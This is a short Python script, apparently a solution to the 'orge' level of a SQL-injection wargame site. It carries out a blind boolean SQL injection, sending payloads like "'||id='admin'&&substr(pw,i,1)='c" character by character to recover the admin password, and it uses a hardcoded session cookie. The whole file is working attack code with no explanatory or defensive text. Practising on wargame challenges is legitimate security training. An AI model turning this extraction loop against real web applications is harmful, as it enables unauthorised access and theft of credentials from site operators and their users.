import requests

target = "https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php"
cookies = {"PHPSESSID": "q6g6gipia2tga8jpt11pvvanrb"}
length = 8

pw = ''

ds = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9','a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']


print("Start")
for i in range(1, length + 1):
	for j in ds: 
	        pay = f"?pw='||id='admin'%26%26substr(pw,{i},1)='{j}"
	        res = requests.get(target + pay, cookies=cookies)
	        if "Hello admin" in res.text:
	            pw += j
	            print(j)
	            break
print("pw :", pw)
